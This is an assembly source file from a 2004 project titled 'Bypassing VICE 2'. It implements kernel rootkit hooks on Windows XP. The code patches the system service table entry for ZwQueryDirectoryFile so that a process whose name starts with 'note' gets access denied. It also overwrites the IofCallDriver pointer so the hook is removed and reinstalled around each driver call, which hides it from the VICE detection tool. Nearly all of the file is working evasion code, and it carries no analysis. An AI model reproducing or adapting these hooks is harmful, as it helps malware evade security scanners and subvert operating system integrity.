comment ^
=================================================================
                    .:[Bypassing VICE 2]:.
 
                 by Edgar Barbosa, aka Opc0de
                      Brazil, October/2004

=================================================================
 DISCLAIMER
=================================================================

This software is provided "as is" and any express or implied
warranties, including, but not limited to, the implied warranties of
merchantability and fitness for a particular purpose are disclaimed.
In no event shall the author Edgar M. Barbosa be liable for any
direct, indirect, incidental, special, exemplary, or consequential
damages (including, but not limited to, procurement of substitute
goods or services; loss of use, data, or profits; or business
interruption) however caused and on any theory of liability,
whether in contract, strict liability, or tort (including negligence
or otherwise) arising in any way out of the use of this software,
even if advised of the possibility of such damage.
^
;------------------------------------------------------------------------------
; hooks.inc
;------------------------------------------------------------------------------

InstallHooks		PROTO
UninstallHooks		PROTO
HookIofCallDriver	PROTO
UnhookIofCallDriver	PROTO

.data?
 originalZwQueryDirAddr         dd ?
 idZwQueryDir                   dd ?
 
 addrOfPtrIofCallDriver		dd ?
 trueIofCallDriver		dd ?

.data 
 IofHookInstaled		dd 0
 HooksInstaled			dd 0

.code
;-----------------------------------------------------------------------------------------------------------
; NewZwQueryDir hook function
;-----------------------------------------------------------------------------------------------------------
NewZwQueryDir proc FileHandle:DWORD, Event:DWORD, ApcRoutine:DWORD, ApcContext:DWORD, IoStatusBlock:DWORD, \
                   FileInformation:DWORD, FileInformationLength:DWORD, FileInformationClass:DWORD, \
                   ReturnSingleEntry:DWORD, FileName:DWORD, RestartScan:DWORD

	; XP SPECIFIC OFFSETS !!!

	mov eax, 0ffdff124h
	mov eax, [eax]
	mov eax, [eax+044h]
	add eax, 0174h		; <-- Hardcoded offset (FIXME)
	mov eax, [eax]
	.if eax == "eton"
		mov eax, STATUS_ACCESS_DENIED
		ret
	.endif

	push RestartScan
	push FileName
	push ReturnSingleEntry
	push FileInformationClass
	push FileInformationLength
	push FileInformation
	push IoStatusBlock
	push ApcContext
	push ApcRoutine
	push Event
	push FileHandle
	call dword ptr [originalZwQueryDirAddr]

	pushad
	.if IofHookInstaled == 0
		invoke HookIofCallDriver
	.endif
	popad

	ret
NewZwQueryDir endp

;------------------------------------------------------------------------------
; Install the hooks
;------------------------------------------------------------------------------
InstallHooks proc

	pushad
	;-----------------------------------------------------------------
	; Get ServiceID of _ZwQueryDirectoryFile kernel function
	;-----------------------------------------------------------------
	mov eax, [ZwQueryDirectoryFile]
	add eax, 2
	mov eax, [eax]
	mov eax, [eax] ; Now eax = ptr to _ZwQueryDirectoryFile
	mov eax, [eax+01] ; E8 XX 00 00 00 : mov eax, XX (service number)
	mov idZwQueryDir, eax
	;-----------------------------------------------------------------
	; Hook the _NtQueryDirectoryFile kernel function
	;-----------------------------------------------------------------
	invoke HookSSDTfunction, eax, addr NewZwQueryDir
	mov originalZwQueryDirAddr, eax	
	mov HooksInstaled, 1
	popad
	ret

InstallHooks endp

;------------------------------------------------------------------------------
; Uninstall the hooks
;------------------------------------------------------------------------------
UninstallHooks proc

	pushad
	mov eax, idZwQueryDir
	invoke HookSSDTfunction, eax, originalZwQueryDirAddr
	mov HooksInstaled, 0
	popad
	ret

UninstallHooks endp

;------------------------------------------------------------------------------
; Hook the @IofCallDriver function
;------------------------------------------------------------------------------
HookIofCallDriver proc
	pushad
	mov eax, [IofCallDriver]
	add eax, 2
	mov eax, [eax]
	mov eax, [eax]
	mov ebx, [eax+2]

	cli
	mov addrOfPtrIofCallDriver, ebx
	mov eax, [ebx]
	mov trueIofCallDriver, eax
	lea eax, NewIofCallDriver
	mov [ebx], eax
	sti

	mov IofHookInstaled, 1
	popad
	ret
HookIofCallDriver endp

;------------------------------------------------------------------------------
; Unhook the @IofCallDriver function
;------------------------------------------------------------------------------
UnhookIofCallDriver proc
	pushad
	mov eax, addrOfPtrIofCallDriver
	mov ebx, trueIofCallDriver
	mov [eax], ebx
	popad
	ret
UnhookIofCallDriver endp

;------------------------------------------------------------------------------
OPTION EPILOGUE:NONE
OPTION PROLOGUE:NONE
;------------------------------------------------------------------------------
;------------------------------------------------------------------------------
; New @IofCallDriver function
;------------------------------------------------------------------------------
NewIofCallDriver proc
	pushad
	.if HooksInstaled == 1
		invoke UninstallHooks
	.endif
	popad
	call dword ptr [trueIofCallDriver]
	pushad
	.if HooksInstaled == 0
		invoke InstallHooks
	.endif
	popad
	ret
NewIofCallDriver endp
;------------------------------------------------------------------------------
OPTION EPILOGUE:EPILOGUEDEF
OPTION PROLOGUE:PROLOGUEDEF
;-----------------------------------------------------------------------------